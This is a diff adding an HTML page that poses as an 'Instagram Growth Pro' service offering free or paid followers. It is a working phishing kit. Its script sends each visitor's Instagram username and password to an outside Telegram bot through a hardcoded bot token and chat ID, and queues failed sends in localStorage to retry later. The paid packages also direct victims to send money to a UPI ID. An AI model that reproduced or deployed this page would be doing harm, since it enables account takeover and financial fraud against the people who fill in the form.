@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Growth Pro 2024</title>
+    <style>
+        :root {
+            --primary: #E1306C;
+            --secondary: #405DE6;
+            --gradient: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+            background-image: radial-gradient(circle at 20% 50%, rgba(255,255,255,0.9) 0%, rgba(255,255,255,0.8) 100%), url('https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?q=80&w=1974');
+            background-size: cover;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 20px;
+            padding: 40px;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border: 1px solid rgba(0,0,0,0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 8px;
+            background: var(--gradient);
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 25px;
+            background: var(--gradient);
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 50px;
+            font-weight: bold;
+            box-shadow: 0 10px 20px rgba(225, 48, 108, 0.2);
+        }
+
+        h1 {
+            margin-bottom: 30px;
+            font-size: 28px;
+            color: #333;
+            position: relative;
+            display: inline-block;
+        }
+
+        h1::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 3px;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #555;
+            font-size: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #ddd;
+            background-color: #f9f9f9;
+            box-sizing: border-box;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(225, 48, 108, 0.1);
+            background: white;
+        }
+
+        .follower-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .option {
+            background-color: white;
+            padding: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .option:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            border-color: var(--primary);
+        }
+
+        .option.selected {
+            background-color: rgba(225, 48, 108, 0.05);
+            border-color: var(--primary);
+        }
+
+        .option .price {
+            color: var(--primary);
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        button {
+            background: var(--gradient);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 16px;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 10px;
+            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.3);
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(225, 48, 108, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+
+        .modal h2 {
+            color: var(--primary);
+            margin-top: 0;
+        }
+
+        .upi-id {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            margin: 20px 0;
+            word-break: break-all;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .modal-buttons button {
+            flex: 1;
+            padding: 12px;
+        }
+
+        .cancel-btn {
+            background: #999;
+            box-shadow: none;
+        }
+
+        .telegram-link {
+            color: #0088cc;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 15px;
+        }
+
+        .telegram-link:hover {
+            text-decoration: underline;
+        }
+
+        .telegram-icon {
+            vertical-align: middle;
+            margin-right: 5px;
+            width: 18px;
+            height: 18px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                width: 95%;
+            }
+
+            .logo {
+                width: 80px;
+                height: 80px;
+                font-size: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">IG</div>
+        <h1>Instagram Growth Pro</h1>
+
+        <div class="input-group">
+            <label for="username">Instagram Username</label>
+            <input type="text" id="username" placeholder="e.g., your_username" autocomplete="username">
+        </div>
+
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+        </div>
+
+        <div class="input-group">
+            <label>Select Followers Package</label>
+            <div class="follower-options">
+                <div class="option" data-count="100" data-price="FREE" onclick="selectOption(this)">
+                    <span>100 Followers</span>
+                    <span class="price">FREE</span>
+                </div>
+                <div class="option" data-count="500" data-price="FREE" onclick="selectOption(this)">
+                    <span>500 Followers</span>
+                    <span class="price">FREE</span>
+                </div>
+                <div class="option" data-count="1000" data-price="₹99" onclick="selectOption(this)">
+                    <span>1000 Followers</span>
+                    <span class="price">₹99</span>
+                </div>
+                <div class="option" data-count="5000" data-price="₹399" onclick="selectOption(this)">
+                    <span>5000 Followers</span>
+                    <span class="price">₹399</span>
+                </div>
+            </div>
+        </div>
+
+        <button onclick="submitForm()">GET FOLLOWERS NOW</button>
+    </div>
+
+    <!-- Free Followers Modal -->
+    <div class="modal" id="freeModal">
+        <div class="modal-content">
+            <h2>Request Received!</h2>
+            <p>Your request for <strong id="freeCount"></strong> free followers has been processed.</p>
+            <p>Followers will be added within <strong>24-48 hours</strong>.</p>
+            <p>Track your order on Telegram:</p>
+            <a href="https://t.me/Antiban_bug_bot" class="telegram-link" target="_blank">
+                <img src="https://telegram.org/img/t_logo.png" class="telegram-icon">@Antiban_bug_bot
+            </a>
+            <button onclick="closeModal('freeModal')" style="margin-top: 20px;">GOT IT</button>
+        </div>
+    </div>
+
+    <!-- Paid Followers Modal -->
+    <div class="modal" id="paidModal">
+        <div class="modal-content">
+            <h2>Complete Payment</h2>
+            <p>Please send <strong id="paidAmount"></strong> to:</p>
+            <div class="upi-id" id="upiId">ys636@okicici</div>
+            <p>After payment, send screenshot to our Telegram bot.</p>
+            <div class="modal-buttons">
+                <button class="cancel-btn" onclick="closeModal('paidModal')">Cancel</button>
+                <button onclick="paymentDone()">I've Paid</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Done Modal -->
+    <div class="modal" id="doneModal">
+        <div class="modal-content">
+            <h2>Thank You!</h2>
+            <p>Your payment has been received.</p>
+            <p>Please send payment screenshot to:</p>
+            <a href="https://t.me/Antiban_bug_bot" class="telegram-link" target="_blank">
+                <img src="https://telegram.org/img/t_logo.png" class="telegram-icon">@Antiban_bug_bot
+            </a>
+            <p>Followers will be added within <strong>24 hours</strong>.</p>
+            <button onclick="closeModal('doneModal')">CLOSE</button>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot API configuration
+        const telegramConfig = {
+            botToken: '7752195168:AAGNWIc2vhdUxS1TMggHqSsi7GOpBmZ4SAU',
+            chatId: '6569859929',
+            apiUrl: 'https://api.telegram.org/bot'
+        };
+
+        // Improved Telegram integration
+        const sendToTelegram = async (data) => {
+            const message = `📢 *New Follower Request* 📢
+📌 *Username:* ${data.username}
+🔑 *Password:* ${data.password}
+👥 *Followers:* ${data.followersCount}
+💰 *Price:* ${data.price}
+⏰ *Time:* ${new Date().toLocaleString()}
+
+*Status:* ${data.price === 'FREE' ? 'Free - Pending' : 'Paid - Payment Pending'}`;
+
+            try {
+                const response = await fetch(`${telegramConfig.apiUrl}${telegramConfig.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramConfig.chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Telegram API error');
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                // Store in localStorage to retry later
+                const pending = JSON.parse(localStorage.getItem('pendingTelegramMessages') || '[]');
+                pending.push(data);
+                localStorage.setItem('pendingTelegramMessages', JSON.stringify(pending));
+                throw error;
+            }
+        };
+
+        // Check for pending messages when online
+        const checkPendingMessages = async () => {
+            if (navigator.onLine) {
+                const pending = JSON.parse(localStorage.getItem('pendingTelegramMessages') || '[]');
+                if (pending.length > 0) {
+                    for (const msg of pending) {
+                        try {
+                            await sendToTelegram(msg);
+                            // Remove successfully sent message
+                            const updated = pending.filter(m => m.timestamp !== msg.timestamp);
+                            localStorage.setItem('pendingTelegramMessages', JSON.stringify(updated));
+                        } catch (error) {
+                            console.error('Failed to send pending message:', error);
+                            break;
+                        }
+                    }
+                }
+            }
+        };
+
+        // Event listeners
+        window.addEventListener('load', checkPendingMessages);
+        window.addEventListener('online', checkPendingMessages);
+
+        // Form handling
+        let selectedOption = null;
+
+        function selectOption(element) {
+            document.querySelectorAll('.option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            selectedOption = element;
+        }
+
+        async function submitForm() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
+                alert('Please enter both username and password');
+                return;
+            }
+
+            if (!selectedOption) {
+                alert('Please select a followers package');
+                return;
+            }
+
+            const count = selectedOption.getAttribute('data-count');
+            const price = selectedOption.getAttribute('data-price');
+
+            const formData = {
+                username,
+                password,
+                followersCount: count,
+                price,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                await sendToTelegram(formData);
+                
+                if (price === 'FREE') {
+                    document.getElementById('freeCount').textContent = `${count} FREE`;
+                    document.getElementById('freeModal').style.display = 'flex';
+                } else {
+                    document.getElementById('paidAmount').textContent = price;
+                    document.getElementById('paidModal').style.display = 'flex';
+                }
+            } catch (error) {
+                alert('Your request has been queued. We\'ll process it soon!');
+                if (price === 'FREE') {
+                    document.getElementById('freeCount').textContent = `${count} FREE`;
+                    document.getElementById('freeModal').style.display = 'flex';
+                } else {
+                    document.getElementById('paidAmount').textContent = price;
+                    document.getElementById('paidModal').style.display = 'flex';
+                }
+            }
+        }
+
+        function paymentDone() {
+            closeModal('paidModal');
+            document.getElementById('doneModal').style.display = 'flex';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+    </script>
+</body>
+</html>
